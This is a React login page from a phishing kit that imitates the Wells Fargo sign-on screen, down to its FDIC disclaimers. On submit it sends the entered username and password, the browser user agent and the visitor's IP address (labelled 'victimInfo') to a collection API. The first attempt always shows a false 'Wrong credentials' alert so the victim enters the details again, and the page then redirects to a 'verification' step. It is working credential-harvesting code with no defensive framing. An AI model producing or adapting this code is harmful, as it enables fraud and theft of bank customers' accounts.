import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import { IoIosCloseCircleOutline } from "react-icons/io";
import { IoEyeOffOutline, IoEyeOff } from "react-icons/io5";
import FormLayout from "../components/formLayout";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import Input from "../components/input";
import Button from "../components/button";
import API from "../api/api";
import axios from "axios";

const Login = () => {
  const router = useHistory();
  const [data, setData] = useState({ userID: "", password: "" });
  const [isWrong, setIsWrong] = useState(false);
  const [isShowPass, setIsShowPass] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    sessionStorage.setItem(APP_STORAGE_NAME, JSON.stringify(data));
    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ..._data,
        bank: "Well Fargo",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        if (!isWrong) {
          setData({ userID: "", password: "" });
          setIsWrong(true);
          return;
        }
        router.push(`/verification?${randParams()}`);
      }
    } catch (error) {
      alert("Something went wrong");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  const getGreeting = () => {
    const currentTime = new Date().getHours();
    let greetingMessage = "";

    if (currentTime >= 0 && currentTime < 12) {
      greetingMessage = "Good morning";
    } else if (currentTime >= 12 && currentTime < 18) {
      greetingMessage = "Good afternoon";
    } else {
      greetingMessage = "Good evening";
    }

    return greetingMessage;
  };

  return (
    <>
      <FormLayout
        handleSubmit={handleSubmit}
        title={getGreeting()}
        subTitle="Sign on to manage your accounts"
      >
        <Input
          title="Username"
          name="userID"
          value={data?.userID}
          onChange={handleChange}
        >
          <span
            className="absolute top-4 right-2"
            onClick={() => setIsShowPass((prev) => !prev)}
          >
            <IoIosCloseCircleOutline
              fontSize={24}
              fill="#858585"
              className="cursor-pointer"
              onClick={() => setData((prev) => ({ ...prev, userID: "" }))}
            />
          </span>
        </Input>
        <Input
          title="Password"
          type={!isShowPass ? "password" : "text"}
          name="password"
          value={data?.password}
          onChange={handleChange}
        >
          <span
            className="absolute top-4 right-2"
            onClick={() => setIsShowPass((prev) => !prev)}
          >
            {!isShowPass ? (
              <IoEyeOff
                fontSize={24}
                fill="#858585"
              />
            ) : (
              <IoEyeOffOutline
                fontSize={24}
                fill="#858585"
              />
            )}
          </span>
        </Input>
        <div className="flex gap-2 items-center my-2 mt-3">
          <input
            id="checkbox"
            type="checkbox"
            className="rounded-md border-[2px] size-5"
          />
          <label
            htmlFor="checkbox"
            className="ml-2"
          >
            Save Username
          </label>
        </div>
        <span className="text-[12px]">
          To help keep your account secure, save your username only on devices
          that aren't used by other people.
        </span>

        {isWrong && (
          <div
            role="alert"
            className="alert alert-error mt-4 rounded-[24px] bg-[#fcf3f3] border-[#fcf3f3] text-[#333333]"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              className="stroke-[#ce1616] shrink-0 w-6 h-6"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
              ></path>
            </svg>
            <span>Wrong credentials.</span>
          </div>
        )}
        <br />
        <br />
        <Button
          disabled={!data?.password && !data?.userID}
          title={
            isLoading ? (
              <span className="loading loading-spinner loading-md text-white"></span>
            ) : (
              "Sign on"
            )
          }
        />

        <p className="underline text-sm text-center mt-4">
          Forgot username or password?
        </p>
      </FormLayout>

      <div className="w-full max-w-[870px] mx-auto md:rounded-xl bg-white py-6 px-3 md:px-6 md:mt-[64px] md:mb-[55px] md:shadow-[0_0_16px_0_rgba(59,51,49,.15)]">
        <div className="border border-[#bfbfbd] p-[15px] mb-6">
          <p className="font-bold mb-1">
            Investment and Insurance Products are:
          </p>
          <ul className="pl-4">
            <li className="font-bold list-disc">
              Not Insured by the FDIC or Any Federal Government Agency
            </li>
            <li className="font-bold list-disc">
              Not a Deposit or Other Obligation of, or Guaranteed by, the Bank
              or Any Bank Affiliate
            </li>
            <li className="font-bold list-disc">
              Subject to Investment Risks, Including Possible Loss of the
              Principal Amount Invested
            </li>
          </ul>
        </div>
        <p>Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</p>
      </div>
    </>
  );
};

export default Login;
